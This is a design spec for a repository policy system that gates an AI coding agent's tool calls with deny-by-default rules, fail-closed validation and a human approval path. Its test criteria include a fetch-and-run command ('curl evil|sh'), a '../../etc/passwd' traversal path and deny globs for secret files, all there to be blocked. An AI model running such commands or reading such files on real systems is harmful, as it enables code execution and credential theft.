# F04 — Repo Policy System (`.forge/policy.yaml` + `AGENTS.md`)

> Phase: v1 · Spec module(s): Repo Policy Layer (`policy-sdk`), Repo Policy System (FORGE_SPEC.md §"Repo Policy System"), Security §"Policy evaluation" · Status target: **Done** = a connected repo's `.forge/policy.yaml` and `AGENTS.md` are loaded, schema-validated (fail-closed on parse/validation error and on a missing required policy), persisted as an auditable snapshot, exposed over `/policy/*`, rendered read-only in the web UI, and every agent tool call is evaluated against the parsed policy by a deterministic `PolicyEvaluator` whose decisions are unit-tested against the canonical spec example. The five `examples/policies/*.yaml` validate against the loader.

---

## 1. Intent — what & why

Forge's third core design principle is *"Repo-aware and policy-aware. Every run must know its repo target, allowed commands, restricted paths, completion criteria, and skill requirements before starting."* and security requires *"Every tool invocation checked against repo policy before execution."* F04 is the package that makes both true.

It does three things:

1. **Load** the two repo-resident control files for a target repo:
   - `.forge/policy.yaml` — machine-readable policy (write/review/deploy/knowledge/skill/subagent rules + named commands).
   - `AGENTS.md` — narrative instructions injected into agent context at run start (the Open SWE repo-context-loading pattern).
2. **Validate** them with a strict (extra-keys-forbidden, fail-closed) Pydantic schema so a typo in a `deny:` rule can never silently widen permissions, and snapshot the resolved policy per commit for audit ("which policy version governed this run").
3. **Evaluate** every agent `ToolCall` against the parsed `Policy` deterministically (no LLM judgement), returning an allow/deny `Decision` with a matched-rule citation and a `requires_approval` flag that feeds the Human Approval System's policy-override gate.

Without F04, the agent runtime (single-agent loop, `v1/F06-single-execution-agent`) has no gate, the workflow precondition `policy_loaded` (FORGE_SPEC.md §Workflow DSL, `task_ready → executing`, owned by `v1/F07-feature-workflow-fsm`) can't be satisfied, and the knowledge service can't apply the 1.5× freshness weight to policy/AGENTS.md files. F04 is the security spine that the agent runtime, workflow engine, and approval layer all depend on.

---

## 2. User-facing behavior / journeys

**Repo maintainer (human).**
1. Adds `.forge/policy.yaml` + `AGENTS.md` to their repo and connects it via the GitHub App (`F03`).
2. Opens **Project → Repo → Policy** in the web UI and sees the effective policy rendered read-only: write allow/deny globs, review rules, deploy rules, allowed skill profiles, subagent rules, and an `AGENTS.md` preview, with a "valid / N errors" badge.
3. While editing locally, runs `forge policy lint .` (CLI) or pastes YAML into the in-UI validator and gets line-referenced errors before pushing.

**Agent runtime (machine), during a run.**
1. On run start the runtime calls `load_policy(worktree_root)`; a missing or invalid required policy blocks the run (workflow → `needs_human_input`) instead of running unbounded.
2. `AGENTS.md` content is injected into the agent's system context.
3. For every tool call (write a file, run a command, deploy, spawn a subagent, choose a skill profile), the tool registry calls `evaluator.evaluate(tool_call, policy)`. A `deny` aborts the call and records a denied `Step`; a `deny` with `requires_approval=True` (e.g. an out-of-policy deploy) raises a policy-override `ApprovalRequest` instead of silently failing.

**Admin (human).**
1. Creates reusable `PolicyProfile` templates at the workspace level (e.g. "python-api-strict") so new repos can start from a vetted baseline.
2. Audits, for any past `AgentRun`, the exact `RepoPolicySnapshot` (policy YAML + AGENTS.md checksum + commit SHA) that governed it.

---

## 3. Vertical slice

### 3.1 Data model (tables/columns/migrations touched)

`PolicyProfile` already exists from the Phase-0 data model (reusable policy templates, workspace-scoped). F04 **uses** it and **adds** one new table plus one additive column.

**Existing — used as-is (`packages/db/forge_db/models/policy_profile.py`):**

| column | type | notes |
|---|---|---|
| `id` | UUID PK | |
| `workspace_id` | UUID FK → `workspace.id` | tenant scope |
| `name` | text, unique per workspace | |
| `description` | text null | |
| `body` | JSONB | must validate against the `Policy` schema (§4); enforced in `PolicyService`, not the DB |
| `created_at` / `updated_at` | timestamptz | |

**New table — `RepoPolicySnapshot` (`packages/db/forge_db/models/repo_policy_snapshot.py`):** immutable, append-only audit of a resolved policy at a commit.

| column | type | notes |
|---|---|---|
| `id` | UUID PK | |
| `workspace_id` | UUID FK → `workspace.id` | tenant scope |
| `repo_connection_id` | UUID FK → `repository_connection.id` | |
| `commit_sha` | text | git SHA the files were read at |
| `policy_json` | JSONB | the parsed-and-revalidated `Policy.model_dump()` |
| `policy_sha256` | char(64) | checksum of raw `.forge/policy.yaml` bytes |
| `agents_md_sha256` | char(64) null | checksum of raw `AGENTS.md` bytes (null if absent) |
| `agents_md_object_key` | text null | MinIO key for the raw `AGENTS.md` body (kept out of the row) |
| `is_valid` | bool | false snapshots store `validation_errors` and govern nothing |
| `validation_errors` | JSONB | `[{loc, msg, type}]` from Pydantic when invalid |
| `loaded_at` | timestamptz | |

- Unique constraint: `(repo_connection_id, commit_sha)` — one snapshot per commit; re-resolution is idempotent.
- Append-only: enforced in the service (no UPDATE/DELETE path); rows are the audit trail.

**Additive column — `AgentRun.policy_snapshot_id`** (`packages/db/forge_db/models/agent_run.py`): nullable UUID FK → `repo_policy_snapshot.id`, set when an `AgentRun` begins so the run trace and approval UI can cite the governing policy version.

**Migration:** one Alembic revision `xxxx_add_repo_policy_snapshot` — `CREATE TABLE repo_policy_snapshot` (+ indexes on `repo_connection_id`, `workspace_id`) and `ALTER TABLE agent_run ADD COLUMN policy_snapshot_id UUID NULL REFERENCES repo_policy_snapshot(id)`. Both additive and backward-compatible.

### 3.2 Backend (FastAPI routes + services/packages)

**Package `packages/policy-sdk/forge_policy/` (the core; no FastAPI imports):**

- `schema.py` — the `Policy` Pydantic tree (§4) re-exported from `forge_contracts` so the YAML-facing model and the frozen contract DTO are the same object.
- `loader.py` — `load_policy()`, `load()` (Protocol method), `load_agents_md()`, `RepoPolicyBundle`.
- `matching.py` — `pathspec`-backed gitwildmatch glob matching (`**`, `*.pem`, `.env*` semantics) with deny-precedence.
- `evaluator.py` — `DefaultPolicyEvaluator(PolicyEvaluator)` with `load()` + `evaluate()`.
- `errors.py` — `PolicyNotFoundError`, `PolicyValidationError`, `PolicyError`.
- `defaults.py` — `DENY_ALL_POLICY` (fail-closed sentinel when `required=False`).

**Service `apps/api/forge_api/services/policy_service.py`:** orchestrates DB + integration-sdk + policy-sdk.

- `resolve_effective_policy(repo_connection_id, ref="default") -> RepoPolicySnapshot` — fetch `.forge/policy.yaml` + `AGENTS.md` from GitHub at `ref` via integration-sdk (`F03`), resolve commit SHA, parse with policy-sdk, upsert a `RepoPolicySnapshot` (idempotent on `(repo_connection_id, commit_sha)`), store raw `AGENTS.md` body in MinIO. Invalid files produce an `is_valid=False` snapshot, never an exception bubbling to the client.
- `validate_policy_yaml(raw: str) -> PolicyLintResult` — parse-only, returns errors/warnings without persistence (UI + CLI).
- `evaluate_tool_call(repo_connection_id, ref, tool_call) -> Decision` — dry-run debug endpoint.
- `list_profiles / create_profile / update_profile` — `PolicyProfile` CRUD; `body` revalidated against `Policy` on write.

**Router `apps/api/forge_api/routers/policy.py`** (router pre-stubbed in Phase 0; F04 fills handlers). All routes require auth; mutating routes require `admin`; `evaluate` requires `admin` or `agent-runner` (RBAC roles + auth dependency from the foundation slice `v1/F00-foundation-substrate`; see §5):

| Method & path | Body → Response | Purpose |
|---|---|---|
| `GET /policy/repos/{repo_connection_id}` | → `EffectivePolicyResponse` | rendered effective policy + AGENTS.md metadata for the UI |
| `POST /policy/validate` | `PolicyValidateRequest{yaml: str}` → `PolicyLintResult` | lint a policy.yaml without saving |
| `POST /policy/repos/{repo_connection_id}/evaluate` | `EvaluateRequest{tool_call: ToolCall, ref?: str}` → `Decision` | dry-run policy decision (debug) |
| `GET /policy/profiles` | → `list[PolicyProfileOut]` | list workspace templates |
| `POST /policy/profiles` | `PolicyProfileIn` → `PolicyProfileOut` | create template (validates `body`) |
| `PUT /policy/profiles/{id}` | `PolicyProfileIn` → `PolicyProfileOut` | update template |

**CLI `apps/api/forge_api/cli/policy.py`** (under `forge-cli`):
- `forge policy lint <path>` — exit 0/1, prints line-referenced errors (wraps `validate_policy_yaml`).
- `forge policy show <repo_connection_id>` — prints the resolved effective policy (wraps the service).

### 3.3 Worker / agent runtime (Celery tasks, LangGraph, if any)

- **Celery task `refresh_repo_policy_snapshot(repo_connection_id, commit_sha)`** (`apps/worker/forge_worker/tasks/policy.py`): enqueued by the GitHub webhook handler (`F03`) when a push touches `.forge/policy.yaml` or `AGENTS.md`; calls `PolicyService.resolve_effective_policy`. This keeps the policy/AGENTS.md "highest freshness" promise (chunk weight 1.5× in knowledge-core) and pre-warms the snapshot before the next run.
- **Agent-runtime consumption (`v1/F06-single-execution-agent`, not built here, contract defined here):**
  - At run start: `bundle = load_policy(worktree_root)`; `AgentRun.policy_snapshot_id` set; `bundle.agents_md.content` injected into the system context (truncated to `AGENTS_MD_MAX_TOKENS`, default 8000, with a logged warning on truncation).
  - The tool registry wraps every dispatch: `decision = evaluator.evaluate(tool_call, bundle.policy)`. `deny` → tool not executed, recorded as a denied `Step`. `deny` + `requires_approval=True` → emit a policy-override `ApprovalRequest` (FORGE_SPEC.md Approval Gate "Policy override — Always required") which is what the workflow engine's `escalation_policy.on_policy_conflict: escalate_to_admin` (`v1/F07-feature-workflow-fsm`) consumes. The agent **never** self-overrides (Build Prompt constraint 2).
- **No LangGraph node is added by F04** — F04 provides the synchronous `evaluate()` the runtime's tool node calls.

### 3.4 Frontend / UI (Next.js routes/components, if any)

Route `apps/web/app/(board)/projects/[projectId]/repos/[repoId]/policy/page.tsx` plus components in `apps/web/components/policy/`:

- `EffectivePolicyView` — read-only rendering of write/review/deploy/knowledge/skill/subagent rules (tables + glob chips); a "Valid" / "N errors" badge from `is_valid`.
- `AgentsMdPreview` — markdown preview of `AGENTS.md` with a "not present" empty state.
- `PolicyValidator` — textarea posting to `POST /policy/validate` (debounced) with inline error list (loc + message).
- `PolicyProfilesTable` (admin) — list/create/edit `PolicyProfile` templates (TanStack Table).

Data via TanStack Query hooks (`usePolicy(repoId)`, `useValidatePolicy()`, `usePolicyProfiles()`). No write path to the repo files themselves (those live in git); the UI is read + validate + template-manage only.

### 3.5 Infra / deploy (compose, helm, caddy, if any)

Mostly N/A for runtime infra (no new service/container). F04 ships two repo artifacts:

- **`examples/policies/*.yaml`** — 5 canonical policies (Python API, TypeScript frontend, Go service, infrastructure, docs) per OSS Strategy. A CI gate (`pytest packages/policy-sdk/tests/test_examples.py`) loads each through `load_policy` and asserts `is_valid`.
- **`packages/policy-sdk/forge_policy/policy.schema.json`** — JSON Schema generated from the `Policy` Pydantic model (`Policy.model_json_schema()`), checked into the repo and used by the web validator and editor tooling. A test asserts the committed file matches the regenerated schema (drift guard).

---

## 4. Public interfaces / contracts (exact signatures, Pydantic models, Protocols, YAML schemas)

**Frozen Protocol (from Phase-0 `forge_contracts`, implemented here):**

```python
class PolicyEvaluator(Protocol):
    def load(self, repo_root: Path) -> "Policy": ...
    def evaluate(self, action: "ToolCall", policy: "Policy") -> "Decision": ...
```

**Pydantic models (`forge_contracts/policy.py`, re-exported by `forge_policy.schema`):**

```python
from enum import StrEnum
from typing import Any, Literal
from pydantic import BaseModel, ConfigDict, Field, model_validator

class SubAgentRole(StrEnum):
    PLANNER = "planner"; RESEARCHER = "researcher"; IMPLEMENTER = "implementer"
    TESTER = "tester"; REVIEWER = "reviewer"; SECURITY = "security"

class PolicyCommands(BaseModel):
    model_config = ConfigDict(extra="allow")  # open map: custom named commands (e.g. e2e) allowed
    install: str | None = None
    lint: str | None = None
    type_check: str | None = None
    test: str | None = None
    test_coverage: str | None = None
    build: str | None = None
    def all_commands(self) -> set[str]:
        """Every configured command string — the run_command allowlist.
        Includes the declared fields above AND any custom named commands
        captured via model_extra (e.g. `e2e: playwright test`); None values excluded."""

class WriteRules(BaseModel):
    model_config = ConfigDict(extra="forbid")
    allow: list[str] = Field(default_factory=list)
    deny: list[str] = Field(default_factory=list)

class ReviewRules(BaseModel):
    model_config = ConfigDict(extra="forbid")
    required_reviewers: list[str] = Field(default_factory=list)
    approval_required_for_merge: bool = True
    min_approvals: int = 1

class DeployRules(BaseModel):
    model_config = ConfigDict(extra="forbid")
    allow_agent_deploy: bool = False
    environments: list[str] = Field(default_factory=list)
    restricted_environments: list[str] = Field(default_factory=list)

class KnowledgeRules(BaseModel):
    model_config = ConfigDict(extra="forbid")
    index_paths: list[str] = Field(default_factory=list)
    exclude_paths: list[str] = Field(default_factory=list)
    freshness_sla_hours: int = 24

class SkillProfilesRef(BaseModel):
    model_config = ConfigDict(extra="forbid")
    default: str
    allowed: list[str] = Field(default_factory=list)
    @model_validator(mode="after")
    def _default_in_allowed(self) -> "SkillProfilesRef":
        if self.default not in self.allowed:
            self.allowed = [self.default, *self.allowed]
        return self

class SubagentRules(BaseModel):
    model_config = ConfigDict(extra="forbid")
    allow_subagents: bool = False
    allowed_roles: list[SubAgentRole] = Field(default_factory=list)
    max_parallel: int = 0

class Policy(BaseModel):
    model_config = ConfigDict(extra="forbid")  # typo'd keys => validation error, never silent widening
    schema_version: int = 1
    repo_id: str
    name: str
    purpose: str | None = None
    languages: list[str] = Field(default_factory=list)
    entrypoints: list[str] = Field(default_factory=list)
    commands: PolicyCommands = Field(default_factory=PolicyCommands)
    write_rules: WriteRules = Field(default_factory=WriteRules)
    review_rules: ReviewRules = Field(default_factory=ReviewRules)
    deploy_rules: DeployRules = Field(default_factory=DeployRules)
    knowledge_rules: KnowledgeRules = Field(default_factory=KnowledgeRules)
    skill_profiles: SkillProfilesRef
    subagent_rules: SubagentRules = Field(default_factory=SubagentRules)

class ToolCall(BaseModel):
    name: str                       # canonical action: write_file|write_code|create_file|delete_file|move_file|
                                    # run_command|deploy|promote_environment|open_pr|push|merge|
                                    # spawn_subagent|use_skill_profile|read_repo|read_spec|
                                    # read_knowledge|search_knowledge|query_mcp|...
    path: str | None = None         # repo-relative POSIX path for filesystem actions
    args: dict[str, Any] = Field(default_factory=dict)  # {"environment":...}|{"role":...}|{"command":...}|{"skill_profile":...}|{"branch":...}

class Decision(BaseModel):
    effect: Literal["allow", "deny"]
    reason: str
    matched_rule: str | None = None  # e.g. "write_rules.deny[2]='secrets/**'"
    requires_approval: bool = False  # deny that the approval layer may override (policy-override gate)
    severity: Literal["info", "warning", "critical"] = "info"
    @property
    def allowed(self) -> bool:
        return self.effect == "allow"
```

**Loader / bundle (`forge_policy.loader`):**

```python
POLICY_PATH = ".forge/policy.yaml"
AGENTS_PATHS = ("AGENTS.md", ".forge/AGENTS.md")  # first hit wins

class AgentsDoc(BaseModel):
    content: str
    path: str
    sha256: str
    sections: dict[str, str]      # parsed by H2 (## ...) heading -> body
    token_estimate: int           # len(content)//4 heuristic

class RepoPolicyBundle(BaseModel):
    policy: Policy
    agents_md: AgentsDoc | None
    policy_path: str
    policy_sha256: str

def load_policy(repo_root: Path, *, required: bool = True) -> RepoPolicyBundle:
    """Read+validate .forge/policy.yaml (+ AGENTS.md) from a checked-out repo root.
    Raises PolicyNotFoundError if required and policy.yaml is absent.
    Raises PolicyValidationError on YAML parse error or schema violation (fail-closed).
    AGENTS.md is optional; absence -> bundle.agents_md is None (no error)."""

def load_agents_md(repo_root: Path) -> AgentsDoc | None: ...
```

**Evaluator (`forge_policy.evaluator`) — deterministic decision order:**

```python
class DefaultPolicyEvaluator:
    def load(self, repo_root: Path) -> Policy:
        return load_policy(repo_root).policy
    def evaluate(self, action: ToolCall, policy: Policy) -> Decision: ...
```

`evaluate()` algorithm (pure, no I/O, total — every path returns a `Decision`):

1. **Filesystem write/delete** (`write_file|write_code|create_file|delete_file|move_file`):
   - `action.path` required → else `deny` ("write action without path", `critical`).
   - Reject absolute paths and `..` traversal after `PurePosixPath` normalization → `deny` (`critical`, `matched_rule="path_traversal"`).
   - If any `write_rules.deny` glob matches → `deny` (**deny precedence**), `matched_rule` cites the glob; `critical` if the glob is in the secret-like set (`*.pem`, `*.key`, `.env*`, `secrets/**`), else `warning`.
   - Else if any `write_rules.allow` glob matches → `allow`.
   - Else → `deny` ("path not covered by write_rules.allow", default-deny, `warning`).
2. **`run_command`**: normalize `args["command"]`; if it is not in `policy.commands.all_commands()` → `deny` + `requires_approval=True` ("command not in policy allowlist", `warning`). Else `allow`.
3. **`deploy` / `promote_environment`**: `env = args["environment"]`.
   - `not deploy_rules.allow_agent_deploy` → `deny` + `requires_approval=True` (`critical`).
   - `env in restricted_environments` → `deny` + `requires_approval=True` (`critical`).
   - `env in environments` → `allow`.
   - else → `deny` ("environment not in deploy_rules.environments", `warning`).
4. **`spawn_subagent`**: `role = args["role"]`.
   - `not subagent_rules.allow_subagents` → `deny`.
   - `role not in subagent_rules.allowed_roles` → `deny`.
   - else → `allow` (reason carries `max_parallel`; concurrency enforced by the coordinator, not the evaluator).
5. **`use_skill_profile`**: `name = args["skill_profile"]`; `name not in skill_profiles.allowed` → `deny`; else `allow`.
6. **`merge` / `push`** to `args["branch"]` equal to the base/protected branch: if `review_rules.approval_required_for_merge` and `not args.get("human_approved")` → `deny` + `requires_approval=True`; else `allow`.
7. **Read-only actions** (`read_repo|read_spec|read_knowledge|search_knowledge|query_mcp`): `allow`.
8. **Unknown action** → `deny` ("unknown action; default deny", `warning`) — **fail closed** (Build Prompt constraint 2).

**API request/response models (`apps/api/forge_api/schemas/policy.py`):**

```python
class PolicyValidateRequest(BaseModel): yaml: str
class PolicyIssue(BaseModel): loc: list[str | int]; msg: str; type: str; severity: Literal["error","warning"]
class PolicyLintResult(BaseModel): valid: bool; errors: list[PolicyIssue]; warnings: list[PolicyIssue]
class EffectivePolicyResponse(BaseModel):
    repo_connection_id: str; commit_sha: str; is_valid: bool
    policy: Policy | None; agents_md_present: bool; agents_md_excerpt: str | None
    validation_errors: list[PolicyIssue]; loaded_at: datetime
class EvaluateRequest(BaseModel): tool_call: ToolCall; ref: str | None = None
class PolicyProfileIn(BaseModel): name: str; description: str | None = None; body: Policy
class PolicyProfileOut(PolicyProfileIn): id: str; created_at: datetime; updated_at: datetime
```

**Canonical `policy.yaml` schema** — exactly the FORGE_SPEC.md §"Repo Policy System" example; warnings (non-fatal) emitted by the linter when `commands.test`, `commands.lint`, or `write_rules.allow` are empty.

---

## 5. Dependencies — features/slices that must exist first

> **Slug reconciliation.** The platform-foundation and auth/secrets/RBAC concerns are cross-cutting Phase-0 prerequisites that every v1 slice assumes; they do not yet have a dedicated numbered feature file (sibling slices reference the foundation variously as `v1/F00-foundation-substrate`, `v1/F00-platform-foundation`, and `cross-cutting/F00-foundation`, and the auth/RBAC concern as `v1/F15-auth-secrets-rbac` / `cross-cutting/C02-auth-and-rbac`). `v1/F00-foundation-substrate` is used here as the authoritative placeholder; the auth/RBAC primitives are assumed to ship with it until a dedicated auth slice lands. All other slugs below are authoritative and match the files in `docs/implementation-slices/v1/`.

- **`v1/F00-foundation-substrate`** (Phase 0 substrate). **REQUIRED.** Provides: `packages/contracts` (`Policy`/`ToolCall`/`Decision`/`PolicyEvaluator` DTOs + Protocol that F04 implements), `packages/db` base session + `PolicyProfile` model + Alembic baseline, `apps/api` skeleton with the `routers/policy.py` stub pre-registered, the **auth dependency + four RBAC roles (admin/member/viewer/agent-runner)** used to gate `/policy/*`, the `apps/worker` Celery app, the MinIO `ArtifactStore` (raw `AGENTS.md` body), and the web app shell. F04 implements the frozen `PolicyEvaluator` Protocol and the `Policy`/`ToolCall`/`Decision` DTOs declared there.
- **`v1/F03-github-app`** (`packages/integration-sdk`: read a repo file at a ref, resolve commit SHA, push webhook delivery + dedupe). **REQUIRED for the remote-fetch path** (`resolve_effective_policy`, `refresh_repo_policy_snapshot`). The local-worktree path (`load_policy(worktree_root)`) has no GitHub dependency and is fully testable without F03.
- **`v1/F11-skill-profiles`** (`packages/skill-sdk` registry). **OPTIONAL/SOFT** — used only to cross-validate that names in `skill_profiles.allowed`/`default` resolve to real profiles (a linter *warning*, not a hard error, so policies stay loadable without the registry).
- **Downstream consumers (NOT prerequisites; their slices depend on F04):** `v1/F06-single-execution-agent` (tool-call gate via its `PolicyGuard` adapter over `PolicyEvaluator` + `AGENTS.md` injection + `load_policy` at run start), `v1/F07-feature-workflow-fsm` (`policy_loaded` precondition + `escalation_policy.on_policy_conflict: escalate_to_admin`), `v1/F08-plan-execute-verify-pr-approval` (policy-override approval gate; `commands.*` drive `run_checks`; `review_rules` gate merge), `v1/F05-hybrid-knowledge-retrieval` (`knowledge_rules.index_paths`/`exclude_paths`/`freshness_sla_hours` + 1.5× weight for policy/AGENTS.md chunks), `v1/F09-mcp-gateway-v1` (reuses `evaluate()` so MCP tool calls get the same policy gate — spec MCP rule 7), `v1/F12-eval-harness` (consumes the shared `tool_call_matrix` golden decision table). F04 itself ships `examples/policies/*.yaml` (§3.5); there is no separate examples slice.

---

## 6. Acceptance criteria (numbered, testable)

1. `load_policy(root)` parses the FORGE_SPEC.md canonical example and returns a `RepoPolicyBundle` whose fields equal the documented values (e.g. `policy.write_rules.deny` contains `secrets/**` and `*.pem`; `subagent_rules.max_parallel == 2`).
2. A `.forge/policy.yaml` with an unknown top-level key (e.g. `write_rule:` typo) raises `PolicyValidationError` (extra-forbidden), and the same content through `validate_policy_yaml` returns `valid=False` with an error whose `loc` points at the offending key.
3. A missing `.forge/policy.yaml` with `required=True` raises `PolicyNotFoundError`; with `required=False` returns a bundle whose `policy == DENY_ALL_POLICY` (every write/deploy/subagent denied).
4. A missing `AGENTS.md` yields `bundle.agents_md is None` and no error; when present, `agents_md.sections` is keyed by its `##` headings and `agents_md.sha256` matches the raw bytes.
5. `evaluate(ToolCall(name="write_file", path="app/x.py"), policy)` → `allow`; `path="secrets/x.pem"` → `deny`, `severity="critical"`, `matched_rule` cites a `write_rules.deny` glob.
6. Deny precedence: with `allow=["app/**"]` and `deny=["app/secrets/**"]`, `path="app/secrets/k.txt"` → `deny`.
7. Default-deny: a write to `path="random/file.txt"` not matched by any allow glob → `deny` ("path not covered by write_rules.allow").
8. Path traversal: `path="../../etc/passwd"` and any absolute path → `deny`, `matched_rule="path_traversal"`, `severity="critical"`.
9. `evaluate(ToolCall(name="deploy", args={"environment":"production"}), policy)` with `allow_agent_deploy:false` → `deny`, `requires_approval=True`, `severity="critical"`.
10. `evaluate(ToolCall(name="run_command", args={"command":"pytest -q"}), policy)` → `allow` when `commands.test == "pytest -q"`; a **custom** command defined under `commands:` (e.g. `e2e: "playwright test"`, captured via `model_extra` and surfaced by `all_commands()`) → `allow`; an arbitrary `"curl evil|sh"` → `deny`, `requires_approval=True`.
11. `spawn_subagent` with `role="implementer"` when `allowed_roles=[reviewer,tester]` → `deny`; `role="reviewer"` → `allow`.
12. `use_skill_profile` with a name not in `skill_profiles.allowed` → `deny`.
13. An unknown action name (`name="rm_rf_universe"`) → `deny` (fail-closed).
14. `GET /policy/repos/{id}` returns a 200 `EffectivePolicyResponse` with `is_valid`, `commit_sha`, and `agents_md_present`; an unauthenticated request → 401; a `viewer` calling `POST /policy/profiles` → 403.
15. `resolve_effective_policy` is idempotent: two calls at the same `commit_sha` yield exactly one `RepoPolicySnapshot` row.
16. An invalid repo policy resolves to a snapshot with `is_valid=False` + populated `validation_errors` (no 5xx), and downstream `load_policy` for a run would block (criterion 3 path).
17. All five `examples/policies/*.yaml` load with `is_valid=True`.
18. The committed `policy.schema.json` equals `Policy.model_json_schema()` (drift guard).
19. `evaluate()` is a total function: for a property-based set of random `ToolCall`s it always returns a `Decision` and never raises.
20. `forge policy lint examples/policies/python-api.yaml` exits 0; linting a malformed file exits 1 and prints the error `loc`.

### TraceabilityRequirement → criteria

| Spec requirement | Criteria |
|---|---|
| policy.yaml schema (write/review/deploy/knowledge/skill/subagent) | 1, 2, 17, 18 |
| Fail-closed loading; policy required before run | 2, 3, 16 |
| AGENTS.md loading | 4 |
| Every tool invocation evaluated against repo policy | 5–13, 19 |
| Deny-by-default / agent never self-expands scope | 7, 8, 13 |
| Policy-override approval gate | 9, 10 |
| Auditability of governing policy | 15, 16 |
| RBAC on policy routes | 14 |
| OSS example policies | 17, 20 |

---

## 7. Test plan (TDD) — concrete test cases (unit + integration), key fixtures

Write tests first; each maps to a criterion. Layout under `packages/policy-sdk/tests/`, `apps/api/tests/`, `apps/web`.

**Unit — schema (`tests/test_schema.py`):**
- `test_canonical_example_parses` (AC1) — load `tests/fixtures/policy_canonical.yaml` (the spec example), assert field values.
- `test_extra_top_level_key_rejected` (AC2) — `write_rule:` typo → `ValidationError`.
- `test_skill_default_auto_added_to_allowed` — `default` not in `allowed` → injected.
- `test_json_schema_matches_committed` (AC18) — `Policy.model_json_schema()` == committed `policy.schema.json`.

**Unit — loader (`tests/test_loader.py`, uses `tmp_path`):**
- `test_load_full_bundle` (AC1) — write both files into `tmp_path`, assert `RepoPolicyBundle`.
- `test_missing_policy_required_raises` / `test_missing_policy_optional_returns_deny_all` (AC3).
- `test_agents_md_absent_is_none` / `test_agents_md_sections_and_sha` (AC4).
- `test_invalid_yaml_raises_validation_error` (AC2) — malformed YAML → `PolicyValidationError`.

**Unit — evaluator (`tests/test_evaluator.py`):** table-driven over `(ToolCall, expected effect, expected matched_rule?)`:
- write allow/deny/default-deny (AC5–7); deny precedence (AC6); traversal + absolute (AC8).
- deploy restricted/disabled/allowed (AC9); run_command allowlist incl. a custom `model_extra` command surfaced by `all_commands()` (AC10); subagent role (AC11); skill profile (AC12); unknown action (AC13); read-only allow.
- `test_evaluate_is_total` (AC19) — Hypothesis: random `ToolCall` (random name/path/args) always returns a `Decision`.

**Unit — matching (`tests/test_matching.py`):** `**`, `*.pem`, `.env*`, `app/**` against representative paths; confirms `pathspec` gitwildmatch semantics.

**Unit — examples (`tests/test_examples.py`, AC17):** parametrize over `examples/policies/*.yaml`, assert `load_policy` → `is_valid`.

**Integration — API (`apps/api/tests/test_policy_routes.py`, ASGI httpx, Postgres test-container):**
- `test_get_effective_policy_ok` (AC14) — seed a `RepositoryConnection`; stub integration-sdk `read_file` to return the canonical YAML + an AGENTS.md (recorded fixture); assert 200 shape.
- `test_get_effective_policy_unauth_401` / `test_create_profile_viewer_403` (AC14).
- `test_resolve_is_idempotent` (AC15) — call resolve twice at same SHA → one row.
- `test_invalid_repo_policy_snapshot_is_valid_false` (AC16).
- `test_validate_endpoint_reports_loc` (AC2).
- `test_profile_crud_roundtrip` — create/update a `PolicyProfile`; `body` revalidated.

**Integration — worker (`apps/worker/tests/test_policy_task.py`):**
- `test_refresh_snapshot_task` — invoke `refresh_repo_policy_snapshot` with a stubbed service; asserts snapshot upsert.

**CLI (`apps/api/tests/test_policy_cli.py`, AC20):** `forge policy lint` exit codes + error output via `CliRunner`/`subprocess`.

**Frontend (`apps/web`, Vitest + RTL):**
- `EffectivePolicyView` renders rules + valid/invalid badge from a mocked query.
- `PolicyValidator` shows inline errors on a 422-ish lint response.

**Key fixtures:**
- `tests/fixtures/policy_canonical.yaml` — verbatim spec example (the golden input).
- `tests/fixtures/policy_invalid_extra_key.yaml`, `policy_malformed.yaml`.
- `tests/fixtures/AGENTS.md` — multi-`##`-section sample.
- `recorded/github_read_file_policy.json` — recorded integration-sdk response (no live GitHub).
- `tool_call_matrix` — the parametrized evaluator decision table (shared between unit tests and the golden eval harness `v1/F12-eval-harness`).

---

## 8. Security & policy considerations

- **Fail-closed everywhere.** Missing required policy → block (not run). Parse/validation error → `is_valid=False` snapshot that governs nothing; runtime `load_policy` raises. Unknown action → `deny`. `extra="forbid"` so a misspelled `deny`/`restricted_environments` is a hard error, never a silent permission widening.
- **Deny precedence over allow.** Within `write_rules`, any matching `deny` glob wins, so adding a broad `allow: [app/**]` can't accidentally expose `app/secrets/**`.
- **Path-traversal defense.** Filesystem `ToolCall.path` is normalized with `PurePosixPath`; absolute paths and `..` escapes are denied `critical` regardless of globs (prevents writes outside the worktree sandbox, complementing the git-worktree isolation of `v1/F06-single-execution-agent`).
- **Agent never self-expands scope** (Build Prompt constraint 2): the evaluator is pure and policy-driven; out-of-policy actions become `deny` + `requires_approval=True`, routed to the human policy-override gate — the agent cannot grant itself the action.
- **Command allowlisting.** `run_command` is constrained to the named `commands.*` set, making "allowed commands" (Core Principle 3) concrete and blocking arbitrary shell.
- **Auditability.** Every governing policy is snapshotted (`policy_sha256`, `commit_sha`) and linked from `AgentRun.policy_snapshot_id`; snapshots are append-only.
- **Secret redaction.** `AGENTS.md` and policy bodies are content, not secrets, but the evaluator/loader must not log raw `ToolCall.args` (may carry tokens); log `matched_rule`, `effect`, `severity` only — using the foundation's shared secret-redaction filter and consistent with the trace/audit redaction in `v1/F10-run-trace-viewer`.
- **Tenant isolation.** All DB access (`PolicyProfile`, `RepoPolicySnapshot`) is workspace-scoped; routes enforce the caller's workspace.
- **AGENTS.md is untrusted narrative.** It is injected as context, never executed; the evaluator gates actions regardless of what `AGENTS.md` instructs, so a malicious `AGENTS.md` cannot widen permissions.

---

## 9. Effort estimate & risk (S/M/L + key risks)

**Overall: M.** `policy-sdk` core (schema + loader + evaluator + matching) is **S–M** and is the critical path; API/service + snapshot table + UI + CLI + examples add the rest.

| Risk | Severity | Mitigation |
|---|---|---|
| Glob semantics wrong (`**`, deny precedence, `.env*`) silently widening permissions | High | Use `pathspec` (gitwildmatch); dedicated `test_matching.py`; deny-precedence + default-deny asserted; Hypothesis totality test |
| Task-level `allowed_actions`/`restricted_actions` (Task schema) vs repo policy composition ambiguity | Medium | F04 scope = repo policy only; the runtime tool gate composes repo `Decision` with task allow/deny lists; documented as a downstream contract, not implemented here |
| `max_parallel` not enforceable in a pure evaluator | Medium | Evaluator validates role/allowed only; the multi-agent coordinator enforces the concurrency count (V3) |
| AGENTS.md unbounded size blowing the context window | Medium | `token_estimate` + `AGENTS_MD_MAX_TOKENS` truncation with a logged warning |
| Policy drift / stale cache governing a run | Medium | Snapshot keyed by `commit_sha`; webhook-driven `refresh_repo_policy_snapshot`; runtime always re-`load_policy` from the worktree |
| `extra="forbid"` rejecting forward-compat fields | Low | `schema_version` field for evolution; new optional keys land as known fields in a new revision |

---

## 10. Key files / paths (exact)

**Core package:**
- `packages/policy-sdk/forge_policy/__init__.py`
